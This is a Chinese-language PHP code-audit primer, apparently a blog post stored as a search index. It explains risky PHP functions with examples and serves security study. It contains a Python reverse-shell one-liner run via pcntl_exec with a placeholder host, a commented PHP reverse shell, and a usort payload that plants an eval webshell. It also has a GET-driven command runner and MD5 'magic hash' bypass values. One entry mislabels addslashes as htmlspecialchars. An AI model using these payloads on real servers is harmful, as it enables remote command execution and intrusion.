[{"categories":["代码审计"],"content":"PHP代码审计常用到的函数和基础知识","date":"2023-02-08","objectID":"/8/","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":" 信息 参考：https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html ","date":"2023-02-08","objectID":"/8/:0:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"过滤函数 ","date":"2023-02-08","objectID":"/8/:1:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"htmlspecialchars() htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体 预定义的字符： \u0026（和号） 成为\u0026amp; \" （双引号） 成为 \u0026quot; ' （单引号） 成为 \u0026apos; \u003c （小于） 成为 \u0026lt; \u003e （大于） 成为 \u0026gt; ","date":"2023-02-08","objectID":"/8/:1:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"addslashes() htmlspecialchars() 函数会在需要转义的字符之前添加反斜线 被转义的字符： 单引号（`'`） 双引号（`\"`） 反斜线（`\\`） NUL（NUL 字节） ","date":"2023-02-08","objectID":"/8/:1:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"trim() trim() 函数移除字符串两侧的空白字符或其他预定义字符 ","date":"2023-02-08","objectID":"/8/:1:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"代码执行 ","date":"2023-02-08","objectID":"/8/:2:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"eval() eval()函数就是将传入的字符串当作 PHP 代码来进行执行 PHP5在代码错误格式错误之后仍会执行，而PHP7在代码发生错误之后，那么eval()函数就会抛出异常，而不执行之后的代码 \u003c?php $code = \"echo 'This is a PHP7';\"; eval($code); ?\u003e # 访问页面输出：This is a PHP7 ","date":"2023-02-08","objectID":"/8/:2:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"assert() assert()函数是处理异常的一种形式，相当于一个if条件语句的宏定义一样 \u003c?php $code = \"system(whoami)\"; assert($code); ?\u003e # 访问页面爆警告，但不影响输出whoami结果 ","date":"2023-02-08","objectID":"/8/:2:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"preg_replace() preg_replace(1,2,3)将在第三个参数中寻找第一个参数，如果存在则替换成第二个参数，参数遵循正则表达式 preg_replace()函数在PHP 7 后便不再支持，使用preg_replace_callback()进行替换了，取消了不安全的\\e模式 在PHP 5 的环境中 # \\1 用于指定第一个子匹配项 # e eval() 对匹配后的元素执行函数 # i 忽略大小写，匹配不考虑大小写 \u003c?php echo preg_replace('/(.*)/ei', '\\1', 'phpinfo()'); ?\u003e # 访问页面爆警告，但能成功输出phpinfo ","date":"2023-02-08","objectID":"/8/:2:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"create_function() create_function()用来创建一个匿名函数 create_function()函数在内部执行eval()函数来执行代码，在PHP 7.2 之后的版本中已经废弃了create_function()函数 在PHP 5 的环境中 \u003c?php $onefunc = create_function('$a','return system($a);'); $onefunc(whoami); ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:2:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"array_map() array_map()为数组的每个元素应用回调函数 # 代码示例1 \u003c?php $old_array = array(1, 2, 3, 4, 5); function func($arg){ return $arg * $arg; } $new_array = array_map('func',$old_array); var_dump($new_array); ?\u003e # 执行结果 array(5) {[0]=\u003eint(1) [1]=\u003eint(4) [2]=\u003eint(9) [3]=\u003eint(16) [4]=\u003eint(25)} # 代码示例2 \u003c?php $func = 'system'; $cmd = 'whoami'; $old_array[0] = $cmd; $new_array = array_map($func,$old_array); var_dump($new_array); ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:2:5","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"call_user_func() call_user_func()是把第一个参数作为回调函数调用 # 代码示例1 \u003c?php function callback($a,$b){ echo $a . \"\\n\"; echo $b; } call_user_func('callback','我是参数1','我是参数2'); ?\u003e # 执行结果 我是参数1 我是参数2 # 代码示例2 \u003c?php function callback($a){ return system($a); } $cmd = 'whoami'; call_user_func('callback',$cmd); ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:2:6","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"call_user_func_array() call_user_func_array() 函数是把一个数组作为回调函数的参数 # 代码示例1 \u003c?php function callback($a,$b){ echo $a . \"\\n\"; echo $b; } $onearray = array('我是参数1','我是参数2'); call_user_func_array('callback',$onearray); ?\u003e # 执行结果 我是参数1 我是参数2 # 代码示例2 \u003c?php function callback($a){ return system($a); } $cmd = array('whoami'); call_user_func_array('callback',$cmd); ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:2:7","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"array_filter() 依次将array数组中的每个值传到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变 # 官方示例 \u003c?php function odd($var) { return($var \u0026 1); } function even($var) { return(!($var \u0026 1)); } $array1 = array(\"a\"=\u003e1, \"b\"=\u003e2, \"c\"=\u003e3, \"d\"=\u003e4, \"e\"=\u003e5); $array2 = array(6, 7, 8, 9, 10, 11, 12); echo \"Odd :\\n\"; print_r(array_filter($array1, \"odd\")); echo \"Even:\\n\"; print_r(array_filter($array2, \"even\")); ?\u003e # 执行结果 Odd :Array([a] =\u003e 1 [c] =\u003e 3 [e] =\u003e 5) Even:Array([0] =\u003e 6 [2] =\u003e 8 [4] =\u003e 10 [6] =\u003e 12) # 代码示例2 \u003c?php $cmd='whoami'; $array1=array($cmd); $func ='system'; array_filter($array1,$func); ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:2:8","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"usort() 使用用户自定义的比较函数对数组中的值进行排序 usort( array \u0026$array, callable $value_compare_func) : bool 参数 array：输入的数组 cmp_function：在第一个参数小于、等于或大于第二个参数时，该比较函数必须相应地返回一个小于、等于或大于0的数 \u003c?php function func($a,$b){ return ($a\u003c$b)?1:-1; } $onearray=array(1,3,2,5,9); usort($onearray, 'func'); print_r($onearray); ?\u003e # 执行结果 Array ( [0] =\u003e 9 [1] =\u003e 5 [2] =\u003e 3 [3] =\u003e 2 [4] =\u003e 1 ) # 把回调函数换成可以代码执行的函数 \u003c?php usort(...$_GET); ?\u003e # payload: 1.php?1[0]=0\u00261[1]=eval($_POST['x'])\u00262=assert # POST传参: x=phpinfo(); ","date":"2023-02-08","objectID":"/8/:2:9","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"uasort() uasort()函数对数组排序并保持索引和单元之间的关联 # 利用方式与usort()相同 \u003c?php usort(...$_GET); ?\u003e # payload: 1.php?1[0]=0\u00261[1]=eval($_POST['x'])\u00262=assert # POST传参: x=phpinfo(); ","date":"2023-02-08","objectID":"/8/:2:10","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"命令执行 ","date":"2023-02-08","objectID":"/8/:3:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"system() system()函数就是执行外部指令，并且显示输出 \u003c?php $cmd = 'whoami'; system($cmd); ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:3:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"exec() exec()函数和上面system函数没有太大区别，都是执行外部程序指令，只不过这个函数多了一个参数，可以让我们把命令执行输出的结果保存到一个数组中 \u003c?php $cmd = 'whoami'; exec($cmd); ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:3:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"shell_exec() shell_exec() 函数通过shell环境执行命令，并且将完整的输出以字符串的方式返回 如果执行过程中发生错误或者进程不产生输出，那么就返回NULL \u003c?php $cmd = 'whoami'; echo shell_exec($cmd); ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:3:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"`（反撇号） 参考：https://www.cnblogs.com/gaohj/p/3267692.html shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体 \u003c?php echo `whoami`; ?\u003e # 成功输出whoami结果 ","date":"2023-02-08","objectID":"/8/:3:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"passthru() 执行外部程序并且显示原始输出。既然我们已经有执行命令的函数了，那么这个函数我们什么时候会用到呢？ 当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代exec()或system()函数 # 代码示例1 \u003c?php passthru('whoami'); //直接将结果返回到页面 ?\u003e # 代码示例2 \u003c?php passthru('whoami',$result); //将结果返回到一个变量，然后通过输出变量值得到输出内容 echo $result; ?\u003e ","date":"2023-02-08","objectID":"/8/:3:5","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"pcntl_exec() 参考：https://xz.aliyun.com/t/5320 pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序 版本要求：PHP 4 \u003e= 4.2.0, PHP 5 # 与python结合反弹shell \u003c?php pcntl_exec(\"/usr/bin/python\",array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((\"IP\",端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'));?\u003e ","date":"2023-02-08","objectID":"/8/:3:6","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"popen() 参考：https://bbs.huaweicloud.com/blogs/319207 popen()函数可以执行系统命令, 但不会输出执行的结果, 而是返回一个资源类型的变量用来存储系统命令的执行结果, 需要配合fread()函数来读取命令的执行结果 $result = popen( 'ls' , 'r' ); # 参数1:字符串类型,需要执行的命令 # 参数2:字符串类型,模式 # 返回值:资源类型,命令执行的结果 echo fread( $result , 100 ); # 参数1:资源类型,需要读取的文件指针 # 参数2:int类型,读取n个字节 # 返回值:字符串类型,读取的文件内容 ","date":"2023-02-08","objectID":"/8/:3:7","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"proc_open() proc_open()函数用法稍显复杂，通常其他函数被过滤时，可以考虑使用此函数 proc_open()执行一个命令，并且打开用来输入/输出的文件指针 类似 popen()函数， 但是proc_open() 提供了更加强大的控制程序执行的能力 # 参考：https://sumygg.com/2015/11/28/executing-command-from-php-and-capturing-output/ # 参考php.net上面的例程，修改了一下写成一个小的php程序，用来测试php执行命令的情况，也可以用来测试服务器上php的环境变量问题 \u003c?php /** * Test executing command from php. * reference: http://php.net/manual/zh/function.proc-open.php * User: Sumy * Date: 2015/11/28 0028 * Time: 19:57 */ $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 =\u003e array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to // 2 =\u003e array(\"file\", \"/tmp/error-output.txt\", \"a\") // stderr is a file to write to 2 =\u003e array(\"pipe\", \"w\") // stderr is a pipe that the child will write to ); $command = isset($_GET[\"command\"]) ? $_GET[\"command\"] : \"java -version\"; $stdin = isset($_GET[\"stdin\"]) ? $_GET[\"stdin\"] : \"\"; $cwd = '/tmp'; // $env = array('some_option' =\u003e 'aeiou'); $process = proc_open($command, $descriptorspec, $pipes, $cwd, null); echo \" \u003cform method='get' action='commandtest.php'\u003e \u003ch1\u003ecommand\u003c/h1\u003e \u003cinput type='text' name='command' value='$command'\u003e \u003ch1\u003estdin\u003c/h1\u003e \u003cinput type='text' name='stdin' value='$stdin'\u003e \u003cinput type='submit' value='run it!'\u003e \u003c/form\u003e \"; if (is_resource($process)) { // $pipes now looks like this: // 0 =\u003e writeable handle connected to child stdin // 1 =\u003e readable handle connected to child stdout // Any error output will be appended to /tmp/error-output.txt fwrite($pipes[0], $stdin); fclose($pipes[0]); echo \"\u003ch1\u003estdout\u003c/h1\u003e\"; echo \"\u003cpre\u003e\"; echo stream_get_contents($pipes[1]); fclose($pipes[1]); echo \"\u003c/pre\u003e\"; echo \"\u003ch1\u003estderr\u003c/h1\u003e\"; echo \"\u003cpre\u003e\"; echo stream_get_contents($pipes[2]); fclose($pipes[2]); echo \"\u003c/pre\u003e\"; // It is important that you close any pipes before calling // proc_close in order to avoid a deadlock $return_value = proc_close($process); echo \"\u003ch1\u003ecommand return\u003c/h1\u003e\"; echo \"\u003cpre\u003e\"; echo \"$return_value\"; echo \"\u003c/pre\u003e\"; } ","date":"2023-02-08","objectID":"/8/:3:8","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"文件包含 ","date":"2023-02-08","objectID":"/8/:4:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"include() include()将会包含语句并执行指定文件 如果包含文件不存在，报错，但会往下执行 # 代码示例1.php \u003c?php highlight_file(__FILE__); $file = $_GET['file']; //远程文件包含需要修改配置，allow_url_include = on，php默认不开启远程文件包含 include $file; ? # 代码示例2.php \u003c?php //这里可以使用PHP来反弹shell //$sock=fsockopen(\"127.0.0.1\",4444);exec(\"bin/bash -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\"); echo '\u003cbr\u003e\u003ch1\u003e[*]backdoor is running!\u003c/h1\u003e'; ?\u003e # payload 1.php?file=2.php ","date":"2023-02-08","objectID":"/8/:4:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"include_once() include_once()与include()没有太大区别，唯一的其区别已经在名称中体现了，就是相同的文件只包含一次 ","date":"2023-02-08","objectID":"/8/:4:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"require() require()的实现和include()功能几乎完全相同 区别：如果包含文件不存在，报错，不在执行 ","date":"2023-02-08","objectID":"/8/:4:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"require_once() 相同的文件只包含一次 ","date":"2023-02-08","objectID":"/8/:4:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"文件读取(下载) ","date":"2023-02-08","objectID":"/8/:5:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"file_get_contents() 函数功能是将整个文件读入一个字符串 \u003c?php echo file_get_contents('demo.txt'); ?\u003e # 执行结果 I am a demo text ","date":"2023-02-08","objectID":"/8/:5:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"fopen() 此函数将打开一个文件或URL，如果 fopen() 失败，它将返回 FALSE 并附带错误信息。我们可以通过在函数名前面添加一个 @ 来隐藏错误输出 \u003c?php $file = fopen(\"demo.txt\",\"rb\"); $content = fread($file,1024); echo $content; fclose($file); ?\u003e # 这段代码中其实也包含了fread的用法。因为fread仅仅只是打开一个文件，要想读取还得需要用到fread来读取文件内容 # 执行结果 I am a demo text ","date":"2023-02-08","objectID":"/8/:5:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"fread() 函数刚才在上个函数中基本已经演示过了，就是读取文件内容 ","date":"2023-02-08","objectID":"/8/:5:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"fgetss() 这个函数跟上个没什么差别，也是从打开的文件中读取去一行，只不过过滤掉了 HTML 和 PHP 标签 \u003c?php $file = fopen(\"demo.html\",\"r\"); echo fgetss($file); fclose($file); ?\u003e # demo.html代码 \u003ch1\u003eI am a demo\u003c/h1\u003e # 执行结果 I am a demo ","date":"2023-02-08","objectID":"/8/:5:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"readfile() 此函数将读取一个文件，并写入到输出缓冲中。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息 \u003c?php echo \"\u003cbr\u003e\" . readfile(\"demo.txt\"); ?\u003e # demo.txt I am a demo:) I am a demo:( # 执行结果 I am a demo:) I am a demo:( 27 # 我们看到不仅输出了所有内容，而且还输出了总共长度。但是没有输出换行 ","date":"2023-02-08","objectID":"/8/:5:5","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"file() 把文件读入到一个数组中，数组中每一个元素对应的是文件中的一行 \u003c?php print_r(file(\"demo.txt\")); ?\u003e # 执行结果 Array ( [0] =\u003e I am the first line! [1] =\u003e I am the second line! ) ","date":"2023-02-08","objectID":"/8/:5:6","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"parse_ini_file() parse_ini_file()功能是解析一个配置文件(ini文件)，并以数组的形式返回其中的位置 \u003c?php print_r(parse_ini_file(\"demo.ini\")); ?\u003e # demo.ini内容 [names] me = Robert you = Peter [urls] first = \"http://www.example.com\" second = \"https://www.runoob.com\" # 执行结果 Array ( [me] =\u003e Robert [you] =\u003e Peter [first] =\u003e http://www.example.com [second] =\u003e https://www.runoob.com ) ","date":"2023-02-08","objectID":"/8/:5:7","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"show_source()/highlight_file() show_source()/highlight_file()其作用就是让php代码显示在页面上。这两个没有任何区别，show_source其实就是highlight_file的别名 ","date":"2023-02-08","objectID":"/8/:5:8","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"文件上传 ","date":"2023-02-08","objectID":"/8/:6:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"move_uploaded_file() 此函数是将上传的文件移动到新位置 move_uploaded_file(file,newloc) 参数 file：必需，规定要移动的文件 newloc：必需，规定文件的新位置 本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。 如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。 如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。 代码示例： $fileName = $_SERVER['DOCUMENT_ROOT'].'/uploads/'.$_FILES['file']['name']; move_uploaded_file($_FILES['file']['tmp_name'],$fileName ) 这段代码就是直接接收上传的文件，没有进行任何的过滤，那么当我们上传getshell的后门时，就可以直接获取权限，可见这个函数是不能乱用的，即便要用也要将过滤规则完善好，防止上传不合法文件 ","date":"2023-02-08","objectID":"/8/:6:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"文件删除 ","date":"2023-02-08","objectID":"/8/:7:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"unlink() 此函数用来删除文件。成功返回 TURE ，失败返回 FALSE unlink(filename,context) 参数 filename：必需。要删除的文件 context：可选。句柄环境 我们知道，一些网站是有删除功能的。比如常见的论坛网站，是有删除评论或者文章功能的。倘若网站没有对删除处做限制，那么就可能会导致任意文件删除（甚至删除网站源码） 代码示例： \u003c?php $file = \"demo.txt\"; if(unlink($file)){ echo(\"$file have been deleted\"); } else{ echo(\"$file not exist?\"); } ?\u003e ","date":"2023-02-08","objectID":"/8/:7:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"session_destroy() session_destroy()函数用来销毁一个会话中的全部数据，但并不会重置当前会话所关联的全局变量，同时也不会重置会话 cookie 代码示例： \u003c?php // 初始化会话 // 如果要使用会话，别忘了现在就调用： session_start(); // 重置会话中的所有变量 $_SESSION = array(); // 如果要清理的更彻底，那么同时删除会话 cookie // 注意：这样不但销毁了会话中的数据，还同时销毁了会话本身 if (ini_get(\"session.use_cookies\")) { $params = session_get_cookie_params(); setcookie(session_name(), '', time() - 42000, $params[\"path\"], $params[\"domain\"], $params[\"secure\"], $params[\"httponly\"] ); } // 最后，销毁会话 session_destroy(); ?\u003e ","date":"2023-02-08","objectID":"/8/:7:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"变量覆盖 ","date":"2023-02-08","objectID":"/8/:8:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"extract() 函数从数组中将变量提取出来可以覆盖当前符号表中的变量 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量 该函数返回成功设置的变量数目 # 代码示例1 \u003c?php $color = \"blue\"; $one_array = array(\"color\" =\u003e \"red\", \"size\" =\u003e \"medium\", \"name\" =\u003e \"dog\"); extract($one_array); echo \"$color, $size, $name\"; ?\u003e # 执行结果 red, medium, dog # 代码示例2 \u003c?php $name = 'cat'; extract($_POST); echo $name; ?\u003e # 参时如果我们POST传入name=dog，那么页面将会回显dog ","date":"2023-02-08","objectID":"/8/:8:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"parse_str() 此函数把查询到的字符串解析到变量中 parse_str(string,array) 参数 string：必需。规定要解析的字符串 array：可选。规定存储变量的数组名称。该参数只是变量存储到数组中 # 代码示例1 \u003c?php parse_str(\"name=Ameng\u0026sex=boy\",$a); print_r($a); ?\u003e # 执行结果 Array ( [name] =\u003e Ameng [sex] =\u003e boy ) # 代码示例2 \u003c?php $name = 'who'; $age = '20'; parse_str(\"name=Ameng\u0026age=21\"); echo \"$name, $age\"; ?\u003e # 执行结果 Ameng, 21 变量name和age都发生了变化，被新的值覆盖了。这里用的是 PHP 7.4.3 版本。发现这个函数的这个作用还是存在的，且没有任何危险提示 ","date":"2023-02-08","objectID":"/8/:8:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"import_request_variables() 此函数将GET/POST/Cookie变量导入到全局作用域中。从而能够达到变量覆盖的作用 版本要求：PHP 4 \u003e= 4.1.0，PHP 5 \u003c 5.4.0 bool import_request_variables ( string $types [, string $prefix ] ) 参数 types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量 prefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误 代码示例 \u003c?php $name = 'who'; import_request_variables('gp'); if($name == 'Ameng'){ echo $name; } else{ echo 'You are not Ameng'; } ?\u003e 如果什么变量也不传，那么页面将回显You are not Ameng如果通过GET或者POST传入name=Ameng那么页面就会回显Ameng ","date":"2023-02-08","objectID":"/8/:8:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"foreach()结合$$ 有两种语法： foreach (array_expression as $value) statement foreach (array_expression as $key =\u003e $value) statement 第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步 第二种格式做同样的事，只是除了当前单元的键名也会在每次循环中被赋给变量 $key # 代码示例 \u003c?php $name = 'who'; foreach($_GET as $key =\u003e $value) { $$key = $value; } if($name == \"Ameng\"){ echo 'You are right!'; } else{ echo 'You are flase!'; } ?\u003e 当我们直接打开页面的时候它会输出You are false!,而当我们通过GET传参name=Ameng的时候，它会回显You are right! 关键点就在于$$这种写法。这种写法称为可变变量。一个变量能够获取一个普通变量的值作为这个可变变量的变量名。当使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。这样就产生了变量覆盖漏洞，如上代码示例。其执行过程为$$key=$name，最后赋值为$value，从而实现了变量覆盖 ","date":"2023-02-08","objectID":"/8/:8:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"弱类型比较 ","date":"2023-02-08","objectID":"/8/:9:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"==和=== ==：会先进行类型转换，然后进行对比 ===：会先对类型进行比较，再对数值进行比较 //由0e开头都会被认为是0 $a = \"0e1234\"; $b = \"0e1235\"; var_dump($a == $b); //true var_dump(\"admin\" == 0); //true var_dump(\"1admin\" == 1); //true var_dump(\"admin1\" == 1); //false var_dump(\"admin1\" == 0); //true $a = \"1 and 1=1\"; var_dump(in_array($a,array(0,1,2,3,4,5),true)); //false 强比较 === var_dump(in_array($a,array(0,1,2,3,4,5))); //true 弱比较 ","date":"2023-02-08","objectID":"/8/:9:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"md5()函数和sha1()绕过 PHP 在处理哈希字符串的时候，会使用!=或者==来对哈希值进行比较，它会把每一个0E开头的哈希值都解释为0 如果两个不同的值，经过哈希以后它们都变成了0E开头的哈希值，那么 PHP 就会将它们视作相等处理 # MD5加密（0E开头的哈希值） s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 # md5代码示例 \u003c?php $a = $_GET['a']; $b = $_GET['b']; if($a != $b \u0026\u0026 md5($a) == md5($b)){ echo '这就是弱类型绕过'; } else{ echo '再思考一下'; } ?\u003e # 从上面我给出的哪些值中，挑两个不同的值传入参数，就能看到相应的结果 # sha1()代码示例 \u003c?php $a = $_GET['a']; $b = $_GET['b']; if(isset($a,$b)){ if(sha1($a) === sha1($b)){ echo 'nice!!!'; } else{ echo 'Try again!'; } } ?\u003e # 传入`a[]=1\u0026b[]=2`的时候，虽然它会给出警告，说我们应该传入字符串而不应该是数组，但是它还是输出了`nice!!!`，所以可以用数字来绕过`sha1()`函数的比较 ","date":"2023-02-08","objectID":"/8/:9:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"is_numeric()绕过 此函数是检测变量是否为数字或者数字字符串 is_numeric( mixed $var) : bool 如果var是数字或者数字字符串那么就返回TRUE，否则就返回FALSE \u003c?php $a = is_numeric('0x31206f722031'); if($a){ echo 'It meets my requirement'; } else{ echo 'Try again'; } ?\u003e # 执行结果 It meets my requirement 0x31206f722031是or 1=1的十六进制，如果某处使用了此函数，并将修饰后的变量带入数据库查询语句中，就能利用此漏洞实现sql注入 ","date":"2023-02-08","objectID":"/8/:9:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"in_array()绕过 此函数用来检测数组中是否存在某个值 in_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) : bool 参数 needle：带搜索的值(区分大小写) haystack：带搜索的数组 